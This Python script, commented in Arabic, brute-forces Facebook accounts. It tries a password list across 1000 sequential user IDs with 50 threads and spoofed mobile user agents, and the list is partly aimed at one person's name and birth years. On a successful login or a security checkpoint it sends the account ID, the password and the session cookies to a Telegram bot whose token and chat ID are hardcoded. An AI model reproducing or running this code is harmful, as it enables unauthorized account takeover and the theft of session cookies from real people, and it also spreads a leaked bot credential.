import os, sys, time, random, requests, threading
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup
from PIL import Image, ImageDraw

# 🔑 بيانات التليجرام
TOKEN = "8295326912:AAHvVkEnCcryYxnovkD8yQawhBizJA_QE6w"
CHAT_ID = "5653032481"

# 📋 قائمة كلمات مرور محتملة (2004-2005) وتخمينات شائعة
PASS_LIST = [
    '123456', '12345678', '123456789', 'jasser123', 'malo123', 'jasser2004', 'jasser2005',
    'password', '123123', '112233', '445566', '778899', '000000', '111111', '12345',
    'facebook', 'fbfb123', 'love123', 'king123', 'admin123', 'user123', '1234567',
    '20042004', '20052005', '987654321', '654321', '321321', '1234567890'
] + [f'jasser{i}' for i in range(2000, 2010)] + [f'malo{i}' for i in range(2000, 2010)]

def send_to_tg(status, uid, pas, cookie=""):
    msg = f"🔔 {status}\n🆔 ID: {uid}\n🔑 PASS: {pas}\n🍪 COOKIE: {cookie}"
    requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage", json={'chat_id': CHAT_ID, 'text': msg})

def get_ua():
    """بصمة جهاز متطورة"""
    and_v = random.choice(['9', '10', '11', '12'])
    model = random.choice(['SM-G960F', 'SM-A515F', 'RMX2001', 'M2003J15SC'])
    return f"Mozilla/5.0 (Linux; Android {and_v}; {model}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(80, 120)}.0.0.0 Mobile Safari/537.36"

def crack_engine(uid):
    """محرك الفحص: يجرب كل كلمات المرور على حساب واحد"""
    session = requests.Session()
    login_url = "https://m.facebook.com/login.php" # استخدام واجهة الموبايل لسرعة العمليات المتعددة
    
    for pas in PASS_LIST:
        try:
            head = {
                'User-Agent': get_ua(),
                'Accept-Language': 'ar-DZ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
            }
            # جلب الحقول المخفية
            r = session.get(login_url, headers=head, timeout=15)
            soup = BeautifulSoup(r.text, 'html.parser')
            form_data = {i.get("name"): i.get("value") for i in soup.find_all("input", {"type": "hidden"})}
            
            form_data.update({"email": uid, "pass": pas})
            
            # إرسال الدخول
            res = session.post(login_url, data=form_data, headers=head, allow_redirects=False, timeout=15)
            
            if 'c_user' in session.cookies:
                cookie = ";".join([f"{k}={v}" for k, v in session.cookies.items()])
                print(f"\r✅ OK: {uid} | {pas}")
                send_to_tg("✅ حساب ناجح (OK)", uid, pas, cookie)
                break # توقف عند النجاح
            
            elif 'checkpoint' in res.headers.get('Location', ''):
                print(f"\r⚠️ CP: {uid} | {pas}")
                send_to_tg("⚠️ نقطة تفتيش (CP)", uid, pas)
                break # توقف عند الوصول لنقطة تفتيش
                
        except:
            continue
    print(f"\r[+] انتهى فحص {uid}", end="")

def run_main():
    start_id = 26701173 # الايدي المطلوب التوليد عليه
    total_ids = 1000 # عدد الحسابات التي سيتم توليدها وفحصها
    
    print(f"🚀 بدء العمليات المتعددة على المعرف {start_id}...")
    ids_to_check = [str(start_id + i) for i in range(total_ids)]
    
    with ThreadPool(max_workers=50) as pool: # 50 عملية في وقت واحد
        pool.map(crack_engine, ids_to_check)

if __name__ == "__main__":
    run_main()
